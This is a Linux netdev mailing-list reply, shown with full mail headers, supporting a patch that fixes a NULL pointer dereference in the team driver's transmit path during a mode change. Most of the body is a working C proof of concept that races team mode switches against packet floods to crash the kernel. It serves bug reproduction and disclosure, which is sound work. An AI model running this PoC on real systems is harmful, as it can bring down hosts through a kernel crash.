Return-Path: <netdev+bounces-289334-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id UBA9Ic0nDGq/XgUAu9opvQ
	(envelope-from <netdev+bounces-289334-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 19 May 2026 11:05:17 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 37E9457ADDC
	for <lists+netdev@lfdr.de>; Tue, 19 May 2026 11:05:16 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id E5E1F30807D4
	for <lists+netdev@lfdr.de>; Tue, 19 May 2026 08:59:40 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 3C91E3F210B;
	Tue, 19 May 2026 08:57:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="M5E2e4EJ"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 92BEC3F20F9
	for <netdev@vger.kernel.org>; Tue, 19 May 2026 08:57:21 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779181043; cv=none; b=shOH1vI4OtVJeeZookfXFgtoqdOaqo02nGowW04LZa6ZgIYYqH0rOZOkOsDkf0ESF2uaD8aqKJcLCrTxXalTtLYZn6l/hcXswuqVlbyxeSSyVNOE201bHLVY37ycmCq++bwjko2v8Kid8WfDEu5heqnEhmahzvcdyDZFPIVT4xQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779181043; c=relaxed/simple;
	bh=t5WH1qRpRZytJXIarILIDc1GCAp6d6JHrZRzAQlvGhg=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=gY2SdDJVz4Ro1gmgzQGaTGete3QZ+d/PO9NvW97IoSH/MRQ6at6U+oEH4voOiHRigy1JFyYCmPsL+JImXWpEl8cllPcjHifhRQI06bTf34N27y0rE6V9Ze/552kWwRrPoFVBCkS2lj8ctq8gu0Mw7zXDCJ1AvaxVMe1Xzh37S9Y=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=M5E2e4EJ; arc=none smtp.client-ip=209.85.210.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-82f8b60e485so1260699b3a.0
        for <netdev@vger.kernel.org>; Tue, 19 May 2026 01:57:21 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1779181041; x=1779785841; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=cxt9JawV1MwjP0SIG+/vSSw91GTIz4f2JvNGLgzAwEU=;
        b=M5E2e4EJ7Z+rwuY84g9wPWDtnFJ+v+REW8s5QLY6Xyy71gF1id+Le3X+OFxyINAdLT
         kqE3M7JZBlgqxHkF3U7mASPKZKJ7f01f17RsAJhQCa7lBZHJPZS0QfmghZuvihmm58GY
         J5MkBw/fEzaYWP1rDpOsZ6vtJHX7BtaivEC8Clt5THQtAcSBDyZLy1lhh5gvoVYAdiEY
         IS70ttcow64vEQOTwDCb1srtlRXmiOE2E/B1Ha3srRwyLy4xici1nqn3lCs8Zgf6enCB
         a5MkdVzCcbrynYNm9jDMYouchATgNz5/JEv3xir659ZZeN3gruA8xsr3LkNzlxk8l5ST
         E9SA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779181041; x=1779785841;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=cxt9JawV1MwjP0SIG+/vSSw91GTIz4f2JvNGLgzAwEU=;
        b=L/+5BzjvVqOsXh4nimu1mK5oKx7d8UWKm1ri8sQ1frig8kR5SKg+FrnFEhZtE41cBX
         RUPNRFL5uwzTkuGIpPc6KOTjCM1ocb5lazZ77aa9J4d0KtRvjg3UZKvCVeORacA8lykr
         e1iqmsnl2Makrslcfb601F48SN+TeIcP5J6JSdBAsySwJ/D0ICQEHU1C7BeY8P0ZkSoP
         10MBP93mmMlVLu4uoMrnej0/jB4ATdS2oacHgXGkMNNsifpzvkJvIh7++cGNiVZDjpNO
         TOV7uaBEi+RJXwNkq6VIvq4lflJhxfjcouOxPL6zgQyqWoDtjrPmcUuUvA321vy0aZ6a
         bWtg==
X-Forwarded-Encrypted: i=1; AFNElJ/rX03x7kgDwBRni7aIG/OGfivIl0MKp6RD7sSvuOYRIYyi4I0WmAChk2HML/xNooTCRA/c7LY=@vger.kernel.org
X-Gm-Message-State: AOJu0Yzx3WFaiXeJgT0YZsHQfRsvTeWJhvprP9f3qHrlM/55OukGclSG
	RpXWxZnIFEYaxpzqiaSSbD7iKcBdlJw3g93t8KBa3pa83rYqA+vFWJnk
X-Gm-Gg: Acq92OGuZHdW6eaLqlKRTcpNLrdJd8s78jLJgqkWpCqCV209N3T/KFPkQ0IwUrwjoD+
	IkJy7X8PG7yBD3gMLcI+qdjQTrbv8K9GeRfNzlqVsASKakhQc5TT0YSuQuKsDl1vuicj/fkGtDM
	7HdEZ3ITjIoQ4Qowv3JqHbpFQSCeBGyoaPMHydP0XO8RGCAb4FspF3H/nubfgWjrLsh4tGgMY2g
	kHgaobC0KR8tJ1nSb42IGgS4v7ByvIawpfJYvFTjM/KFrwqYnawLbgLOVUtfbJjChfGhCa4XBI5
	TE9b8u34l3j8A9QA0cqQGlMk5Cy1Nz8sbsPdMadLotYffFOzh7wEhf3V59s/rQe6vT5h93w8AHZ
	hzz9uWuV5HAdSGT1BI+qZYgWSdYh3pBIgge0rSKjVdcVyScGqrVqzRjlpZEUHJ3aTZ46b+zGpO2
	G/VPcp2qZZVG+e2Ou6JqZkuuzVqvQQj57TPFBq9evdJvvuob9ZqHg=
X-Received: by 2002:a05:6a00:18a9:b0:82a:f02:7355 with SMTP id d2e1a72fcca58-83f33d24d71mr18205758b3a.32.1779181040693;
        Tue, 19 May 2026 01:57:20 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-83f1977a570sm16319452b3a.20.2026.05.19.01.57.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 19 May 2026 01:57:19 -0700 (PDT)
Date: Tue, 19 May 2026 16:57:14 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Jakub Kicinski <kuba@kernel.org>
Cc: Jiri Pirko <jiri@resnulli.us>, Andrew Lunn <andrew+netdev@lunn.ch>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>, Paolo Abeni <pabeni@redhat.com>,
	netdev@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Subject: Re: [PATCH net v2] net: team: fix NULL pointer dereference in
 team_xmit during mode change
Message-ID: <agwl6tEmP_1khXwK@Air.local>
References: <20260509181825.1523951-2-bestswngs@gmail.com>
 <20260510082509.1530a1a3@kernel.org>
 <agCtGqWLK53TWCaS@Air.local>
 <20260510095937.598c27a6@kernel.org>
 <agrdjt6CjpJo3AYF@Air.local>
 <20260518142230.4403b3ce@kernel.org>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260518142230.4403b3ce@kernel.org>
X-Spamd-Result: default: False [-0.66 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-289334-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	TO_DN_SOME(0.00)[];
	MIME_TRACE(0.00)[0:+];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
	MISSING_XM_UA(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[bestswngs@gmail.com,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[8];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	FREEMAIL_FROM(0.00)[gmail.com];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sto.lore.kernel.org:rdns,sto.lore.kernel.org:helo]
X-Rspamd-Queue-Id: 37E9457ADDC
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr


Required key configs for the poc:

```
CONFIG_NET_TEAM=y
CONFIG_NET_TEAM_MODE_ROUNDROBIN=y
CONFIG_NET_TEAM_MODE_ACTIVEBACKUP=y
CONFIG_NET_TEAM_MODE_BROADCAST=y
CONFIG_PACKET=y
```

The PoC used for reproduction:
```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/genetlink.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

/* team genl uapi constants (from include/uapi/linux/if_team.h) */
#define TEAM_GENL_NAME          "team"
#define TEAM_GENL_VERSION       1
#define TEAM_ATTR_TEAM_IFINDEX  1
#define TEAM_ATTR_LIST_OPTION   2
#define TEAM_ATTR_ITEM_OPTION   1
#define TEAM_ATTR_OPTION_NAME   1
#define TEAM_ATTR_OPTION_TYPE   3
#define TEAM_ATTR_OPTION_DATA   4
#define TEAM_CMD_OPTIONS_SET    1

#ifndef NLA_F_NESTED
#define NLA_F_NESTED 0x8000
#endif

/* enum nla_attr_type from <net/netlink.h>: NLA_UNSPEC=0, NLA_U8=1,
 * NLA_U16=2, NLA_U32=3, NLA_U64=4, NLA_STRING=5. */
#define POC_NLA_STRING 5

static int g_team_ifindex = -1;
static int g_team_family = -1;
static volatile int g_stop = 0;
static volatile unsigned long g_flips = 0;
static volatile unsigned long g_xmits = 0;

static void die(const char *msg)
{
        perror(msg);
        exit(1);
}

/* ---- rtnetlink helpers ---- */

struct nlmsg {
        struct nlmsghdr nh;
        char buf[4096];
};

static void nlmsg_add_attr(struct nlmsghdr *nh, int type, const void *data, int dlen)
{
        struct rtattr *a = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
        a->rta_type = type;
        a->rta_len = RTA_LENGTH(dlen);
        memcpy(RTA_DATA(a), data, dlen);
        nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(a->rta_len);
}

static struct rtattr *nlmsg_add_nested(struct nlmsghdr *nh, int type)
{
        struct rtattr *a = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
        a->rta_type = type;
        a->rta_len = RTA_LENGTH(0);
        nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(a->rta_len);
        return a;
}

static void nlmsg_end_nested(struct nlmsghdr *nh, struct rtattr *nest)
{
        nest->rta_len = (char *)nh + nh->nlmsg_len - (char *)nest;
}

static int create_team_device(const char *name)
{
        int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sk < 0) die("socket rtnetlink");

        struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
        if (bind(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                die("bind nl");

        struct nlmsg m = {0};
        m.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
        m.nh.nlmsg_type = RTM_NEWLINK;
        m.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
        m.nh.nlmsg_seq = 1;

        struct ifinfomsg *ifi = (struct ifinfomsg *)NLMSG_DATA(&m.nh);
        ifi->ifi_family = AF_UNSPEC;
        ifi->ifi_change = 0xffffffff;

        nlmsg_add_attr(&m.nh, IFLA_IFNAME, name, strlen(name) + 1);
        struct rtattr *linkinfo = nlmsg_add_nested(&m.nh, IFLA_LINKINFO);
        nlmsg_add_attr(&m.nh, IFLA_INFO_KIND, "team", 5);
        nlmsg_end_nested(&m.nh, linkinfo);

        if (send(sk, &m, m.nh.nlmsg_len, 0) < 0) die("send RTM_NEWLINK");

        char rbuf[4096];
        int r = recv(sk, rbuf, sizeof(rbuf), 0);
        if (r < 0) die("recv RTM_NEWLINK");
        struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
        if (nh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = NLMSG_DATA(nh);
                if (e->error) {
                        fprintf(stderr, "RTM_NEWLINK: %s (%d)\n",
                                strerror(-e->error), e->error);
                        exit(1);
                }
        }
        close(sk);

        int ifindex = if_nametoindex(name);
        if (!ifindex) die("if_nametoindex");
        return ifindex;
}

static void bring_up(int ifindex)
{
        int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sk < 0) die("socket rtnetlink");

        struct nlmsg m = {0};
        m.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
        m.nh.nlmsg_type = RTM_NEWLINK;
        m.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        m.nh.nlmsg_seq = 2;

        struct ifinfomsg *ifi = (struct ifinfomsg *)NLMSG_DATA(&m.nh);
        ifi->ifi_family = AF_UNSPEC;
        ifi->ifi_index = ifindex;
        ifi->ifi_flags = IFF_UP;
        ifi->ifi_change = IFF_UP;

        if (send(sk, &m, m.nh.nlmsg_len, 0) < 0) die("send set-up");
        char rbuf[4096];
        (void)recv(sk, rbuf, sizeof(rbuf), 0);
        close(sk);
}

/* Force carrier on via .ndo_change_carrier (IFLA_CARRIER=33).
 * team_change_carrier() calls netif_carrier_on() unconditionally, which
 * triggers __linkwatch and eventually transitions txq->qdisc from
 * noop_qdisc to noqueue_qdisc; then packets bypass enqueue and reach
 * dev_hard_start_xmit -> team_xmit. */
static void force_carrier_on(int ifindex)
{
        int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sk < 0) die("socket rtnetlink");

        struct nlmsg m = {0};
        m.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
        m.nh.nlmsg_type = RTM_NEWLINK;
        m.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        m.nh.nlmsg_seq = 3;

        struct ifinfomsg *ifi = (struct ifinfomsg *)NLMSG_DATA(&m.nh);
        ifi->ifi_family = AF_UNSPEC;
        ifi->ifi_index = ifindex;
        ifi->ifi_change = 0;

        uint8_t carrier = 1;
        nlmsg_add_attr(&m.nh, 33 /* IFLA_CARRIER */, &carrier, sizeof(carrier));

        if (send(sk, &m, m.nh.nlmsg_len, 0) < 0) die("send IFLA_CARRIER");
        char rbuf[4096];
        int r = recv(sk, rbuf, sizeof(rbuf), 0);
        if (r > 0) {
                struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
                if (nh->nlmsg_type == NLMSG_ERROR) {
                        struct nlmsgerr *e = NLMSG_DATA(nh);
                        if (e->error)
                                fprintf(stderr, "IFLA_CARRIER set: %d (%s)\n",
                                        e->error, strerror(-e->error));
                }
        }
        close(sk);
}

/* ---- generic netlink: resolve family, send team cmds ---- */

struct genl_msg {
        struct nlmsghdr nh;
        struct genlmsghdr gh;
        char buf[4096];
};

static int genl_resolve_family(const char *name)
{
        int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
        if (sk < 0) die("socket genl");

        struct genl_msg m = {0};
        m.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
        m.nh.nlmsg_type = GENL_ID_CTRL;
        m.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        m.nh.nlmsg_seq = 1;
        m.gh.cmd = CTRL_CMD_GETFAMILY;
        m.gh.version = 1;

        struct rtattr *a = (struct rtattr *)((char *)&m + NLMSG_ALIGN(m.nh.nlmsg_len));
        a->rta_type = CTRL_ATTR_FAMILY_NAME;
        a->rta_len = RTA_LENGTH(strlen(name) + 1);
        strcpy(RTA_DATA(a), name);
        m.nh.nlmsg_len = NLMSG_ALIGN(m.nh.nlmsg_len) + RTA_ALIGN(a->rta_len);

        if (send(sk, &m, m.nh.nlmsg_len, 0) < 0) die("send GETFAMILY");

        char rbuf[4096];
        int r = recv(sk, rbuf, sizeof(rbuf), 0);
        if (r < 0) die("recv GETFAMILY");

        struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
        if (nh->nlmsg_type == NLMSG_ERROR) {
                close(sk);
                return -1;
        }
        struct genlmsghdr *gh = NLMSG_DATA(nh);
        int attrlen = nh->nlmsg_len - NLMSG_SPACE(sizeof(*gh));
        struct rtattr *at = (struct rtattr *)((char *)gh + NLMSG_ALIGN(sizeof(*gh)));
        int id = -1;
        while (RTA_OK(at, attrlen)) {
                if (at->rta_type == CTRL_ATTR_FAMILY_ID) {
                        id = *(uint16_t *)RTA_DATA(at);
                        break;
                }
                at = RTA_NEXT(at, attrlen);
        }
        close(sk);
        return id;
}

static int set_team_mode(int family_id, int ifindex, const char *mode_name)
{
        int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
        if (sk < 0) return -1;

        struct genl_msg m = {0};
        m.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
        m.nh.nlmsg_type = family_id;
        m.nh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        m.nh.nlmsg_seq = 1;
        m.gh.cmd = TEAM_CMD_OPTIONS_SET;
        m.gh.version = TEAM_GENL_VERSION;

        struct nlmsghdr *nh = &m.nh;

        uint32_t idx = ifindex;
        nlmsg_add_attr(nh, TEAM_ATTR_TEAM_IFINDEX, &idx, sizeof(idx));

        /* nested LIST_OPTION { ITEM_OPTION { name=mode, type=NLA_STRING, data=mode_name } } */
        struct rtattr *list = nlmsg_add_nested(nh, TEAM_ATTR_LIST_OPTION);
        struct rtattr *item = nlmsg_add_nested(nh, TEAM_ATTR_ITEM_OPTION);
        nlmsg_add_attr(nh, TEAM_ATTR_OPTION_NAME, "mode", 5);
        uint8_t type = POC_NLA_STRING;
        nlmsg_add_attr(nh, TEAM_ATTR_OPTION_TYPE, &type, sizeof(type));
        nlmsg_add_attr(nh, TEAM_ATTR_OPTION_DATA, mode_name, strlen(mode_name) + 1);
        nlmsg_end_nested(nh, item);
        nlmsg_end_nested(nh, list);

        if (send(sk, &m, nh->nlmsg_len, 0) < 0) {
                close(sk);
                return -1;
        }
        char rbuf[4096];
        int r = recv(sk, rbuf, sizeof(rbuf), 0);
        close(sk);
        if (r < 0) return -1;
        struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
        if (rh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = NLMSG_DATA(rh);
                return e->error;
        }
        return 0;
}

/* ---- threads ---- */

static void pin_to_cpu(int cpu)
{
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
}

static void *xmit_thread(void *arg)
{
        int cpu = (long)arg;
        pin_to_cpu(cpu);

        int sk = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (sk < 0) { perror("AF_PACKET"); return NULL; }

        struct sockaddr_ll sll = {0};
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = g_team_ifindex;
        sll.sll_protocol = htons(ETH_P_ALL);
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xff, 6);

        if (bind(sk, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
                perror("bind AF_PACKET");
                close(sk);
                return NULL;
        }

        unsigned char pkt[64];
        memset(pkt, 0xff, 6);
        memset(pkt + 6, 0x11, 6);
        pkt[12] = 0x08; pkt[13] = 0x00;
        memset(pkt + 14, 0, sizeof(pkt) - 14);

        while (!g_stop) {
                for (int i = 0; i < 256; i++)
                        (void)sendto(sk, pkt, sizeof(pkt), 0,
                                     (struct sockaddr *)&sll, sizeof(sll));
                __sync_fetch_and_add(&g_xmits, 256);
        }
        close(sk);
        return NULL;
}

static void *flipper_thread(void *arg)
{
        int cpu = (long)arg;
        pin_to_cpu(cpu);

        const char *modes[] = { "roundrobin", "activebackup", "broadcast" };
        int i = 0;
        while (!g_stop) {
                const char *m = modes[i % 3];
                (void)set_team_mode(g_team_family, g_team_ifindex, m);
                i++;
                __sync_fetch_and_add(&g_flips, 1);
        }
        return NULL;
}

int main(void)
{
        setbuf(stdout, NULL);
        printf("[*] team ops race PoC starting\n");

        g_team_ifindex = create_team_device("team0");
        printf("[*] team0 created, ifindex=%d\n", g_team_ifindex);

        bring_up(g_team_ifindex);
        printf("[*] team0 is up\n");
        force_carrier_on(g_team_ifindex);
        printf("[*] team0 carrier forced ON\n");

        g_team_family = genl_resolve_family("team");
        if (g_team_family < 0) {
                fprintf(stderr, "failed to resolve team genl family\n");
                return 1;
        }
        printf("[*] team genl family id=%d\n", g_team_family);

        int rc = set_team_mode(g_team_family, g_team_ifindex, "roundrobin");
        printf("[*] initial set mode roundrobin -> %d\n", rc);

        long nthr = sysconf(_SC_NPROCESSORS_ONLN);
        if (nthr < 2) nthr = 2;
        if (nthr > 8) nthr = 8;

        pthread_t fl;
        pthread_create(&fl, NULL, flipper_thread, (void *)(long)0);

        pthread_t xt[8];
        for (long t = 0; t < nthr - 1; t++)
                pthread_create(&xt[t], NULL, xmit_thread,
                               (void *)(long)((t + 1) % nthr));

        for (int s = 0; s < 60 && !g_stop; s++) {
                sleep(1);
                if ((s % 5) == 0)
                        printf("[*] running... %d/60  flips=%lu xmits=%lu\n",
                               s, g_flips, g_xmits);
        }

        g_stop = 1;
        pthread_join(fl, NULL);
        for (long t = 0; t < nthr - 1; t++)
                pthread_join(xt[t], NULL);

        printf("[*] done (no crash observed from userspace side)\n");
        return 0;
}
```

